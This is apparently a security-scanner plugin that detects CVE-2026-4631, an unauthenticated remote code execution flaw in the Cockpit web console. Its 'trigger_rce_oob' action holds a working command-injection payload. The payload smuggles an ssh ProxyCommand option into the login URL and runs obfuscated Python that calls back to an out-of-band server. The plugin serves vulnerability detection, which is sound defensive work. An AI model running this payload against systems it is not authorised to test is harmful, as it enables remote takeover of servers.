# proto-file: proto/templated_plugin.proto
# proto-message: TemplatedPlugin

###############
# PLUGIN INFO #
###############

info: {
  type: VULN_DETECTION
  name: "Cockpit_CVE_2026_4631"
  author: "mangeshwalsane2-hash"
  version: "1.0"
}

finding: {
  main_id: {
    publisher: "GOOGLE"
    value: "CVE-2026-4631"
  }
  severity: CRITICAL
  title: "Unauthenticated Remote Code Execution in Cockpit Web Console (CVE-2026-4631)"
  description: "Cockpit versions prior to 360 pass user-supplied hostnames to ssh without '--', allowing arbitrary command execution via -oProxyCommand when using IPv6 bracketed destination syntax."
  recommendation: "Upgrade Cockpit to version 360 or higher."
  related_id: {
    publisher: "CVE"
    value: "CVE-2026-4631"
  }
}

config: {}

###########
# ACTIONS #
###########

actions: {
  name: "fingerprint_cockpit"
  http_request: {
    method: GET
    uri: "/"
    response: {
      http_status: 200
      expect_all: {
        conditions: [
          { body: {} contains: "is_cockpit_client" },
          { body: {} contains: "cockpit/static/login.js" }
        ]
      }
    }
  }
}

actions: {
  name: "trigger_rce_oob"
  http_request: {
    method: GET
    # The payload builds a URL with the callback server address, port, and hashed secret from the sys.argv array
    uri: "/cockpit+=[-oProxyCommand=python3$IFS-c$IFS\'__import__(bytes([117,114,108,108,105,98,46,114,101,113,117,101,115,116]).decode()).request.urlopen(bytes([104,116,116,112,58,47,47]).decode()+__import__(bytes([115,121,115]).decode()).argv[1]+bytes([58]).decode()+__import__(bytes([115,121,115]).decode()).argv[2]+bytes([47]).decode()+__import__(bytes([104,97,115,104,108,105,98]).decode()).sha3_224(__import__(bytes([115,121,115]).decode()).argv[3].encode()).hexdigest())\'$IFS\'{{ T_CBS_ADDRESS }}\'$IFS\'{{ T_CBS_PORT }}\'$IFS\'{{ T_CBS_SECRET }}\']:22/login"
    headers: [
      {
        name: "Authorization"
        value: "Basic Og=="
      }
    ]
  }
}

actions: {
  name: "sleep"
  utility: { sleep: { duration_ms: 1000 } }
}

actions: {
  name: "check_callback_server_logs"
  callback_server: { action_type: CHECK }
}

#############
# WORKFLOWS #
#############

workflows: {
  condition: REQUIRES_CALLBACK_SERVER
  actions: [
    "fingerprint_cockpit",
    "trigger_rce_oob",
    "sleep",
    "check_callback_server_logs"
  ]
}